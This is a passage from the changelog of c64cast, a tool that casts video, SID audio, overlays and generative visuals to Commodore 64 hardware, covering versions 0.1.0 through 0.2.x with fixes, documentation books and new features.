  instead of playing out as unexplained silence. `--calibrate-dac` uses the same
  verified bring-up, so a run can no longer spend 50 seconds measuring nothing.

- **Ensemble systems no longer record over each other.** `[recording].path`
  cascaded from the master like the rest of the section, so every system in a
  wall opened a `cv2.VideoWriter` on one file and finished with a single
  truncated recording — silently, since the writers have no way to detect the
  collision. `path` is now per-system like `ultimate64.url`: leave it unset and
  each system writes `recording-<system>.mp4`; set it and that path is used as
  written. `enabled` still cascades, so recording a whole wall is still one
  key. `--doctor` reports an error if two systems are pointed at one file
  explicitly.

- **`--doctor` findings can no longer go missing.** The report printed only
  those categories named in a hard-coded list, so a check reporting under any
  other name returned findings that never reached the screen — indistinguishable
  from passing. Unlisted categories now print after the known ones.

- Corrected the troubleshooting advice for a shadowed opencv, which prescribed
  reinstalling `c64cast[all]` — the install that causes the shadowing.

### Changed

- **The README is a landing page again.** It had grown a reference section for
  each surface it introduced — the full keyboard table with its chord
  precedence rules, nine config-discovery commands, the machine-settings
  precedence, the SID-player rationale — all of which the books now state
  properly, from the code. Those are cut down to what someone deciding whether
  to install this needs, and the space goes to what was missing: the pixel
  effect chain (four of the eight effects were listed, and the chain not at
  all), the live performance surfaces (a clip grid, a beat grid, pad LEDs,
  looks and the `/perf` console had no mention outside the docs list), audio
  files as quick-playback arguments, the bitmap spectrum overlay, and the
  character ROM your first run reads off your own machine.

## [0.2.0] - 2026-08-04

### Added

- **c64cast reads the C64 character ROM off your own machine.** Every glyph
  drawn as C64 text — the text overlays on bitmap modes (`scrolling_text`,
  `marquee`, `corner_text`, `logo`), `big_text`, the on-C64 menu, the
  oscilloscope's labels, the preview window and the stream recorder — comes from
  the character ROM. Previously the only way to have one was to find a dump and
  drop it at a working-directory-relative path in a source checkout, which meant
  an installed c64cast could never resolve it and a user report of "the
  scrolling text looks bad" was, in full, "there is no character ROM". Now the
  first run against a machine reads it off the C64 and caches it at
  `<data dir>/roms/chargen.bin`; every later run picks it up. It costs about a
  second, once per machine, and no ROM bytes are shipped or downloaded — they
  move from your hardware to your disk. `--dump-char-rom` re-reads on demand
  (after swapping in a different character ROM, say), `--install-char-rom PATH`
  installs a 2 KB or 4 KB dump you already have with no hardware involved, and
  `[hardware].dump_char_rom = false` turns the automatic read off. `--doctor`
  reports which ROM is in use and whether it verifies.
- **A second book: the Programmer's Reference Guide** (`docs/reference/`), the
  volume you open at the page you need rather than read in order. Seven
  chapters: the configuration language and its precedence rules, the catalog
  of every scene and overlay, the display pipeline from frame to VIC-II
  register, the sound path in both directions, the link into the Commodore's
  memory and what lands there, every input and output that reaches the show from
  outside, and how to extend the program itself. Its appendices
  are *generated* from the code by `scripts/gen_reference_appendices.py`: every
  configuration section and field, every scene key, every overlay parameter, the
  overlay against display-mode matrix, every generator and effect, every
  live-tune target, every command-line flag, every packaged example and every
  optional install extra. They
  read the same definitions that answer `--describe`, `--compat` and
  `--print-schema`, so a table in the book cannot disagree with the program.
  `make reference` renders it, `make books` renders every book, and `make
  reference-appendices` rewrites the generated ones — which CI checks for drift.
- **A third book: the Performance Card** (`docs/card/`), two printable pages for
  the desk beside the controller. Every control surface and what it is mapped to
  out of the box, the pad chords and pad-light states, every live-tune target,
  the clip-grid and tempo syntax, the console's routes, how a channel addresses
  one Commodore of an ensemble, and the four commands worth running before the
  doors open. `make card` renders it; its live-target table is generated
  alongside the reference guide's appendices. It takes the `card` layout: the
  same palette, faces and tables as the other two books, set two-up at 8.5pt
  with no cover, contents or chapter openers.
- The GitHub release now carries **every book**, each stamped with the version:
  the User's Guide, the Programmer's Reference Guide and the Performance Card.

### Removed

- **`docs/usage.md` is gone.** Its 1,867 lines were the end-user reference
  before there was a book to put them in; every part of it that was not already
  duplicated by the User's Guide has been rewritten into the Programmer's
  Reference Guide, which states the same rules from the code rather than from
  prose that had drifted from it. Every link that pointed there now points at
  the chapter or appendix that answers the question, and a test fails if a new
  one appears.

### Changed

- **The Programmer's Reference Guide now documents what a reload actually
  re-reads, and the signals.** `POST /reload` was described as re-reading the
  configuration and rebuilding the playlist, which overpromised: a reload swaps
  `[[scenes]]` and `[interstitial]` and nothing else — the connection, the audio
  path, the capture device and even `[playlist]`'s own `loop` and
  `fade_duration_s` are fixed at startup. Chapter 6 now says so, and gains a
  *Signals* section covering `SIGHUP` (the control-plane-free spelling of the
  same reload, POSIX-only, which the User's Guide advertised and the reference
  never mentioned), `SIGTERM`, and the ensemble rule that each system re-reads
  its own file while the master is not re-read. No behavior changed.
- The `hopalong` generator's live target `source.a` is now **`source.shape`**.
  Every other live target is named for what turning it does — `drift_speed`,
  `ring_freq`, `zoom_speed` — and this one was named for the letter Barry
  Martin's map gives the constant, which tells a performer looking at a knob
  label nothing. Sweeping it reshapes the attractor, so it is `shape`. The
  constant is still `a` in the implementation, where it matches the published
  map. `source.a` was never settable from a config; the one thing this breaks is
  a hand-written `[[midi.mappings]]` entry naming it, which now silently fails to
  match — rename the target.
- `[preview] charset_path` now defaults to unset, meaning "use the character ROM
  c64cast resolved". Set it to force a specific file. A configured path that
  doesn't exist now warns and falls back to the built-in font instead of raising
  `FileNotFoundError` and killing the run.
- The built-in fallback font now fills screen codes `$80-$FF` as the reverse-video
  complement of `$00-$7F`, like the real ROM. They were blank, so with no
  character ROM installed `big_text`'s glyph pixels, the `blocks` PETSCII style
  and most of the PETSCII shading ramp — all of which paint `$A0` and up —
  rendered as nothing.
- The User's Guide build now renders *a book* rather than *the guide*, in
  preparation for a second volume. `scripts/build_guide.py` is
  `scripts/build_book.py --book-dir docs/<book>`, the Typst template and the
  vendored OFL fonts moved from `docs/guide/` to `docs/shared/`, and each book's
  `book.toml` names the layout it takes. `make guide` and the released PDF are
  unchanged.
- **The reference guide's generated appendices are set as two columns instead of
  four.** A field's name, type and default are three facts about one setting,
  and given a column each on a 6.24in page they left the description — the only
  part written for a human — about a third of the measure and four words to a
  line, with a single field running most of a page. They are now stacked into
  one fixed-width column with the description taking the rest, at the same width
  in every such table, so a scene key, an overlay parameter and a CLI flag all
  line up down the book. The reference is 20 pages shorter for it.
- **Chapter and appendix cross-references are links.** "See Appendix F" in the
  prose jumps to Appendix F, and every line of the table of contents jumps to
  its page. A reference to a chapter the book does not have now fails the build,
  which is what catches a renumbering the prose was not told about.
- **Every section of every book can be linked at, and the chapter opener pages
  are clickable.** The contents page already navigated; the opener page listed
  its sections and did nothing when you pressed one. Each `##` and `###` heading
  now carries an anchor, the opener bullets jump to the section they name, and
  the prose can link at a *section* — `[Fades](04-display-pipeline.md#fades)` —
  rather than only at a whole chapter, so a pointer can mean a row in a table
  instead of a page with a big numeral on it. The anchor is GitHub's own, because
  the Markdown is the book: the same link resolves on github.com and in the PDF.
  One that resolves nowhere fails the build and names the nearest ones it knows.
- **The Programmer's Reference Guide has an index**, and it is generated like
  its appendices. Every name the program can utter goes in — configuration
  sections and keys, command-line flags, scene types, overlays, display modes,
  generators, effects and live-tune targets — against the pages that discuss it.
  Locators are **clickable page numbers** in the PDF and section links on
  github.com, from the one source, because the Markdown is the book in one place
  and there are no pages in the other. A key is listed bare, and again under its
  section where two sections share the name; a parameter belonging to a
  generator, an effect or a display mode is filed under its own name with the
  holder in parentheses, so `axis` is where you look and `axis (effect)` is what
  you find. A short curated set of ordinary words — "camera", "dithering",
  "display mode" — is in there for the reader who does not yet know what the
  program calls the thing. Section *titles* are deliberately not entries: a
  topic belongs to the contents page, and nobody looks up "Saving What a Run
  Changed".
- **Each appendix section opens with a worked TOML fragment.** A table of
  settings says what each one means and nothing about where the line is
  written, which left a reader who had found the right knob holding a name and
  no file. Every configuration section, scene type, overlay, generator, effect
  and live-tune mapping now shows the two or three lines that put it in a file,
  with a key's choices as a trailing comment. The fragments are generated from
  the same model as the tables under them and carry only real defaults — a key
  with no default is named in a comment rather than given an invented value.
- **The appendices are in alphabetical order.** Configuration sections and scene
  types were in declaration order, which reads well in the annotated example
  file and is no use in a book nobody reads in order — finding `[wled]` meant
  paging through nineteen sections in an order you could not predict. Overlays
  were already sorted.
- **A field's type and default say which is which.** The two lines under a name
  in every appendix table were bare — `str` over `'serial'` — and only obvious
  to somebody who already knew. They are now labeled *Type:* and *Default:*.
- **The PDF navigates in the numbers it prints.** Page labels — what a reader's
  thumbnail strip and page-number box show — were lowercase roman from the cover
  to the index, on a book whose body is numbered in arabic, so "page 84" and
  page 84 were different pages. The switch at the start of the body now reaches
  the whole document, and a chapter opener is labeled instead of leaving a gap
  in the strip. Both books.
- **Reference tables read better.** No table cell justifies any more: Appendix
  F's "Declared by" lists fourteen generator names down a 1.6in column, and
  justified they came out as two words a line with a river through them. Ranges
  and value counts are set as literals rather than in the body face, where their
  digits stood taller than the mono names beside them and read as the largest
  thing in the table. Appendix E no longer repeats `source.` and `effect.` on
  every one of fifty lines — the holder is stated once above each table — and
  index entries are no longer emboldened, which was setting one column in two
  faces at two apparent sizes.
- **Four more tables say a repeated name once.** Appendix D's rule table gave
  every refused overlay a row, and ten of the thirteen rows read "needs a
  text-capable mode (petscii/blank/hires/mhires)" — the same sentence read ten
  times to learn one thing. It is by the rule now, four rows for the three
  rules, and the appendix fits the page its matrix is on. Appendix B printed
  `duration_s`'s sixty-word description under nine of its ten scene types; it
  sits with the keys every scene takes, over a line naming `video` as the
  exception. Appendix F and the Performance Card drop the holder from every
  live-target row the way Appendix E did — Appendix F heads each section with
  the holder itself (`mode`, `effect`, `source`, `scene`) and says what it
  holds, the card puts it in the column heading.
- **The books, and the code, are spelled in American English.** `color`,
  `behavior`, `quantise`, `analyser`, `center`, `catalogue`, `licence` and the
  rest. The program has always named itself in American English — `color_match`,
  `grayscale`, `palette_mode` — so the prose was disagreeing with the keys it
  was telling the reader to type, sometimes in the same sentence. The `grey` /
  `gray` color alias is untouched: both still resolve.
- **The books no longer talk about their own build.** "Generated from the code by
  `scripts/gen_reference_appendices.py`. Edits here are overwritten" opened every
  appendix and the index; the glossary explained that it was hand-written
  "because a machine has no opinion about which words a reader will not know".
  None of that is for the reader. What the appendices *are* is still said once,
  in the introduction and the colophon, where it belongs.
- **No listing wraps.** Typst wraps an over-long line in a code block rather
  than complaining, and a wrapped listing does not look broken — it looks like a
  line the program never printed. `--profile`'s sample came out as six lines of
  four and a class definition wrapped mid-signature. Every listing in all three
  books now fits its measure, and a test holds them to it.
- **The Programmer's Reference Guide is illustrated.** Five diagrams, for the
  five things in it that are spatial and were being carried entirely by prose:
  the precedence ladder with the extra rung an ensemble inserts, the twelve-step
  display pipeline with the setting that enters at each step, one hardware cell
  in each of the four picture modes with the bytes that color it, the DAC path
  against the sampler path with what each costs the 6510, and the 64 KB during a
  bitmap scene — the VIC's banks drawn as what they are, four 16 KB windows on
  one memory, with color RAM outside all of them. They are drawn by
  `scripts/make_reference_diagrams.py` in the books' own faces and palette, and
  committed; `make reference-figures` redraws them.
- **The books' symbols no longer depend on the machine that built them.** Jost
  has no ✓ and no →, and Typst was filling them from whatever was installed — so
  the compatibility matrix was set in a heavy upright check locally and a thin
  slanted one in CI, from the same source file. Both marks are now drawn by the
  template, Typst's own fallback is off, and a new test fails on any character
  the two vendored faces cannot draw. (One had already got through: a `⇒` in a
  generator's docstring, which is in neither face and was printing as a gap.)
- Inline code in the books is set at 1.08em rather than 1em. The two faces agree
  on x-height but Inconsolata's ascenders and capitals run 12–17% short of
  Jost's, which is what the eye compares when the two meet inside a line, so
  every `[section]`, `--flag` and `6581` sat visibly low in its sentence.
- The appendices' opener pages no longer print the backticks around a section
  name — the section list was being quoted as a string rather than converted —
  and Appendix B's scene types are headed by the type's name rather than by
  `type = "webcam"` repeated ten times.
- **The Performance Card's pad-light table had its columns labeled backwards.**
  `Pad | State` sat over rows reading `Bright | Playing`, which is a light and
  what it means, not a pad and its state — and the reverse of the same table in
  the reference guide. It is now `Light | Means`. The card's gesture table also
  lost pinch-to-resume when its "paused" column was replaced by the performance
  column; the row carries it again.
- **The reference guide's keyboard table lists <kbd>SPACE</kbd>**, which the card
  already had, so the two are the same table. Key names are keycap chips in all
  three books instead of chips in two of them and bold text in the third, and
  they are uppercase throughout, as the keys are.
- The reference guide's glossary defines **C64U**, **TeensyROM+** and **Extra**,
  and its introduction stops promising that the book carries no reasoning: it
  prints the measurement behind a default where there is one, and leaves *which
  other approaches were tried* to `docs/architecture.md`. One passage that was
  pure history with no decision attached is gone.
- The reference guide warns where it should: a `launcher` scene hands the machine
  away and can stop answering the modifier keys, and `--calibrate-dac` replaces
  an existing table with no prompt and no backup.
- Appendices G and H are reachable from the prose — the flag list from the
  notation section, the example index from the section on `example:` names.
  Nothing referred to either of them before.
- The `fireworks` generator's description no longer carries an internal note
  reference, which was published verbatim in Appendix E and in the release PDF.
- **The reference guide can get you connected.** Chapter 1 gains "Naming the
  Hardware": every connection-target scheme, what a target decomposes into in
  `[hardware]`, `[ultimate64]` and `[teensyrom]`, the `dma_port` / `tcp_port` /
  `baud` / `storage` query parameters, what `-s NTSC` / `-s PAL` actually
  changes and why it belongs in machine settings, and a table of the three C64U
  network services against what stops working without each. The one string that
  picks both the backend and its endpoint had appeared only inside two example
  commands, and the volume you open when a machine will not answer never said
  which switch to throw.
- Quick playback's extension-to-scene mapping is in the reference guide's prose
  rather than only inside a help string: which argument becomes which scene,
  what a directory or a glob does, and how a URL's timestamp becomes `start_s`.
- **`[interstitial]` is documented** (Chapter 2) — what the card is, the styles
  it takes, the three things that bypass it, and what else happens at a scene
  boundary.
- Every scene type in the reference guide's catalog now opens with the same
  three facts: which extra it needs, where it looks for files when `file` is
  omitted, and which display modes it accepts.
- **The live-tune write-back is documented** (Chapter 6): what `--overwrite`
  does, what is offered back at exit and what is not, and a warning that saving
  rewrites the whole configuration file from the settings in memory and keeps
  one `.bak` deep.
- **The reference guide's two vaguest chapter titles now say what is in them.**
  "Inside the Machine" is *The Link and the Memory Map*, and "Everything
  Outside" is *Inputs and Outputs* — which is what a reader scanning the
  contents for MIDI, WLED or recording can actually find. The chapter numbers
  are unchanged, so every cross-reference still lands where it did.
- **Extending c64cast is its own chapter** (7) rather than the tail of the
  memory-map chapter. Writing a scene, an overlay, a generator or an effect is
  contributor material, and it was sitting inside a user-facing chapter after a
  write budget. It is appended rather than inserted, so chapters 1 to 6 keep
  their numbers.
- ASID and the MIDI scene are no longer written out twice. Chapter 2's
  catalog entries state what a *configuration* needs — the keys, the extra,
  the ports — and defer the mechanism to Chapter 4, which is the rule the
  introduction sets and was the one place the book broke it.
- **Every optional extra is listed in one place**, as the reference guide's new
  Appendix I: what each one unlocks, the module `--doctor` looks for, and the
  packages it installs — with the reason the install to ask for is
  `c64cast[all]` rather than one extra at a time. The chapters have always named
  an extra where a feature needs one; nothing collected them. The glossary moves
  to Appendix J.
- **The books keep the promise their notation section makes.** A setting that
  can move while a show is running now says so where it is defined: Appendices A
  and B mark a field *live-tunable* and name the target a knob reaches it by
  (`[color].dither` is `mode.dither_method`, which is exactly the pairing a
  reader could not guess), and mark it *menu-live* when the on-C64 menu carries
  it as a knob. Appendix E writes each generator's and effect's parameters the
  way a `cc_map` has to spell them — `source.speed`, not `speed` — so a line can
  be copied straight into a mapping.
- **The performance card's live-target list says who declares each target.** A
  knob mapped to `source.ring_freq` does nothing unless `moire2` is the
  generator on screen, and the column that says so was the one the card dropped
  for space. It is back, and it names them: the modes, effects and generators
  that declare a target, spelled out, because the question at the console is
  whether the thing on screen is in that list and a count — `14 generators` —
  cannot answer it. A target nearly everything declares is written as its
  exceptions instead (`all but fire, mandelbrot, …`). Still two pages.

### Fixed

- **The reference guide offered `https://` as a way to reach a C64U.** The
  machine's REST service is plain HTTP on the ordinary port and has no access
  control of its own, so a reader who followed the table got a connection
  failure. The connection-target tables now show `http://` only, and the prose
  says what the link actually is and points at `SECURITY.md`.
- `--doctor` never reported the `wled` extra, so a missing `zeroconf` — the one
  thing standing between `[wled].listen` and a WLED app that can discover the
  virtual device — showed up as silence in the one command whose job is to say
  what is missing. All twelve extras are now probed, and a test holds the list
  to the extras the package actually declares.

## [0.1.0] - 2026-07-30

The first public release. c64cast has been in daily use against real hardware
since June 2026 — this is the point where it becomes installable rather than
cloneable.

### Added

**Two hardware backends, selected by URI.** `-u u64://HOST` (or `http(s)://`)
drives an [Ultimate 64](https://ultimate64.com/), Ultimate II+, or Commodore 64
Ultimate: memory writes go over the Ultimate DMA Service on TCP port 64 with
REST for the handful of operations that have no DMA equivalent. `-u tr://`
drives a [TeensyROM+](https://lectronz.com/products/teensyrom) cartridge in an
original C64 over auto-detected USB serial, an explicit serial device
(`tr:///dev/cu.usbmodemXYZ`, `tr://COM3`), or raw TCP (`tr://HOST[:PORT]`).
Per-link knobs ride along as query parameters (`u64://host?dma_port=64`,
`tr:///dev/…?baud=2000000`). `$C64CAST_URL` is the environment fallback.

**Ten scene types**, mixed freely in a TOML playlist with per-scene durations
and an "UP NEXT" interstitial between them:

- **video** — MP4/MKV/etc. with its soundtrack, paced off the audio clock so
  A/V cannot drift. YouTube and other streaming URLs resolve through yt-dlp.
- **webcam** — live capture quantized to any display mode in real time.
- **slideshow** — still images from a directory or glob, aspect-fit.
- **waveform** — plays a `.sid` on the real chip through a small player PRG
  DMA'd into C64 RAM (deliberately not the firmware's own runner, which
  hijacks the HDMI output), with a 3-voice oscilloscope driven by a host-side
  py65 SID emulator. Handles multi-SID tunes up to 8 chips on the U64's
  UltiSIDs, and matches 6581/8580 tunes to the installed chips.
- **midi** — bridge a live MIDI source into the real SID and scope each voice.
- **asid** — receive an ASID stream (DeepSID in a browser, SIDFactory II,
  Plogue chipsynth C64) and play it on the real SID with the same scope.
- **generative** — 20 procedural sources (plasma, tunnel, fire, mandelbrot,
  metaballs, game of life, fireworks, soap, …), optionally music-reactive.
- **launcher** — hand the machine over to a native `.prg`/`.crt` and reclaim it.
- **wled** — turn the C64 into a virtual LED matrix fed by a realtime pixel
  stream from LedFx or xLights (DDP or WLED realtime UDP).
- **blank** — a solid PETSCII canvas as a foundation for overlays.

**Six VIC-II display modes** — `petscii`, `mcm`, `hires`, `hires_edges`,
`mhires`, `blank` — each with its own vectorized quantizer (≈30 fps bitmap,
50/60 fps character modes over a LAN). The `[color]` pipeline shapes any source
before quantization: spatial dithering, perceptual color matching, per-cell
strategy selection, motion smoothing, scene fades, and a forced-palette mode
that remaps a frame onto a chosen subset of the 16 C64 colors — with a rolling
palette that re-clusters as the content changes. `--suggest-palette FILE`
analyzes an image or video and ranks the colors that represent it most
faithfully.

**Audio on the real SID.** By default, video and file audio play through the
U64's Ultimate Audio FPGA PCM sampler for high fidelity; the lo-fi `$D418` DAC
path (4-bit, or ≈6–7 bit via Mahoney companding) covers TeensyROM+, mic input,
and webcam audio everywhere. The sampler's effective clock ships calibrated, so
audio holds sync against host-paced video over long runs. `--calibrate-dac`
measures a per-machine DAC response curve through an HDMI capture device.

**Thirteen stackable overlays** — `scrolling_text`, `marquee`, `rss`,
`spectrum_petscii`, `spectrum_bitmap`, `clock`, `weather`, `callsign`,
`countdown`, `network`, `logo`, `big_text`, `obs_status` — composable onto any
compatible scene, with `--compat` printing the overlay × display-mode matrix.

**Ensemble mode.** One process drives N systems at once as a video wall, with
cross-system orchestration — a `big_text` message scrolling across every screen
as one continuous canvas, spans and mirrors — and audio-slot coordination so
the systems do not fight over the DAC.

**Live control surfaces.** The C64's own keyboard (C= pauses, CTRL skips, SHIFT
cycles the display style), an on-C64 menu for live scene tweaks, webcam hand
gestures, a FastAPI control plane (`/pause`, `/resume`, `/skip`, `/reload`),
MIDI CC mapped to any live parameter, and `SIGHUP` to reload the config. The
DJ/VJ layer adds a tempo/beat grid, a clip-launch grid with LED feedback on
grid controllers, a layerable chain of 8 pixel effects, snapshot-recall of
"looks", and a phone/web performance console.

**WLED bridge**, in three directions under one `[wled]` section: drive real LED
matrices *from* the C64's SID with no microphone, present c64cast *as* a virtual
WLED device that the WLED app and Home Assistant discover and control, and turn
the C64 *into* a matrix that LedFx/xLights stream pixels to.

**Quick playback.** `c64cast clip.mp4 tune.sid pics/ 'https://youtu.be/…'`
plays media straight from the command line with no config file, mapping each
argument to the right scene type by extension.

**Config authoring and discovery, all offline.** An annotated TOML reference,
an interactive wizard (`--init`), and a JSON Schema for editor autocomplete —
plus `--describe`, `--list-scenes`, `--list-overlays`, `--list-modes`,
`--compat`, and `--print-schema`, all generated from the same field metadata the
loader itself runs on, so they cannot drift from the code. `--doctor` collects
every config and environment problem in one pass. Machine-local defaults live in
`~/.config/c64cast/settings.toml` (written by `--save-settings`) and persisted
state in `~/.local/share/c64cast/`, both XDG-aware.

**Packaged demo configs.** Every feature has a runnable single-scene demo
shipped inside the wheel: `--config example:NAME` runs one, `--list-examples`
lists them all, `--print-example NAME` copies one out to edit.

**Preview and recording.** An optional local window mirroring what the C64 is
showing, and recording the same to MP4. Both are cv2-based, so neither needs an
optional dependency.

**Documentation.** A typeset User's Guide (10 chapters), a full config
reference, symptom-first troubleshooting, an extension guide, and per-module
architecture notes covering the hardware constraints and the dead ends behind
each design decision. Every install instruction and every missing-extra hint
names `uv`; `pipx` is documented once as an equivalent fallback.

The guide is attached to every release as a PDF, stamped on its cover with the
version it documents, so a downloaded copy can always be matched to the install
it describes. `make guide` renders the same thing from a checkout.

A config written by `--init` or `--save-settings` carries a `#:schema`
directive pinned to its own release, so an editor validates it against the
schema this version actually accepts rather than whatever is currently on
`main`.

**A leading `~` works in config-file paths.** `file`, `videos_dir`,
`songlengths_file`, `charset_path`, `model_path`, a `logo` overlay's file, the
recording path and `log_file` all expand `~/…` when they are used. A TOML file
has no shell to do it, and `glob`/`os.path` treat `~` as a literal directory
name, so such a path previously matched nothing. A `Config` still holds the
string as written, so serialized configs keep the `~` rather than baking in an
absolute home directory.

**Windows is a supported platform.** It always worked — casting to a real
Commodore from Windows is a routine path for one of the contributors — but the
published metadata and the User's Guide both called it untested, because CI only
ever ran on Linux. The test matrix now covers macOS, Linux and Windows across
Python 3.11–3.14, so the claim is backed on both halves: the matrix for the
host-side code, real hardware for the pipeline. The one platform difference worth
knowing is that `SIGHUP` config reload is POSIX-only; `POST /reload` on the
control plane does the same thing everywhere.

[Unreleased]: https://github.com/kfox/c64cast/compare/v0.4.0...HEAD
[0.4.0]: https://github.com/kfox/c64cast/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/kfox/c64cast/compare/v0.2.1...v0.3.0
[0.2.1]: https://github.com/kfox/c64cast/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/kfox/c64cast/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/kfox/c64cast/releases/tag/v0.1.0
